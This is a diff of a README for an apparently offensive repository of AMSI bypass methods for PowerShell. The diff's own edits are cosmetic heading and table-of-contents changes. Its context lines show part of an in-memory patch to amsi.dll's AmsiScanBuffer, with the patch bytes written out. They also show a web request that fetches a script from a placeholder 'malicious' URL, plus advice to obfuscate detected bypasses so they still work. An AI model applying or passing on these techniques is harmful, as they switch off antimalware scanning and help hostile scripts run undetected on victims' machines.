@@ -1,9 +1,18 @@
-# Amsi-Bypass-Powershell
+# Amsi-Bypass-Powershell #
 This repo contains some Amsi Bypass methods i found on different Blog Posts.
 
 Some of the more well known Bypasses are detected by AMSI itself. So you have to obfuscate them via ISESteroids and or Invoke-Obfuscation to get them working.
 
-## 1) Patching amsi.dll AmsiScanBuffer by rasta-mouse
+1.) [Testlink](#heading-1 "Goto heading-1")
+2.) [Testlink2](#1)-Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse "Goto 1)-Patching-amsi.dll-AmsiScanBuffer-by-rasta-mouse")
+3.)
+4.)
+5.)
+6.)
+7.)
+8.)
+
+# 1) Patching amsi.dll AmsiScanBuffer by rasta-mouse #
 ```
 $Win32 = @"
 
@@ -34,7 +43,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
 ```
 
-## 2) Dont use net webclient
+# 2) Dont use net webclient #
 
     $webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)
 
